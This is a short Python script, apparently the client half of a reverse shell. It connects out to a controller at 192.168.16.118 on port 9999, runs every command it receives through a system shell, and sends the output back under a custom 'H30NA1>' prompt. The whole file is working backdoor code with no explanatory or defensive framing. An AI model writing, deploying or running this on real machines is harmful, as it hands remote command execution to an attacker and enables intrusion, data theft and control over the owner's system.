# -------------------------------------------------------------------------------------------------#
import socket
import os
import subprocess
# -------------------------------------------------------------------------------------------------#

s = socket.socket()
HOST = '192.168.16.118'   #Set dynamic IP
PORT = 9999
s.connect((HOST, PORT))

# -------------------------------------------------------------------------------------------------#

while True:
    data = s.recv(1024)
    if data[:2].decode("utf-8") == 'cd':
        os.chdir(data[3:].decode("utf-8"))

    if len(data) > 0:
        terminal = subprocess.Popen(data[:].decode("utf-8"),
        shell=True,
        stdout=subprocess.PIPE,
        stdin=subprocess.PIPE,
        stderr=subprocess.PIPE)

        output_byte = terminal.stdout.read() + terminal.stderr.read()
        output_str = str(output_byte,"utf-8")

        currentWD = os.getcwd() + "H30NA1> "
        s.send(str.encode(output_str + currentWD))

        print(output_str)

# -------------------------------------------------------------------------------------------------#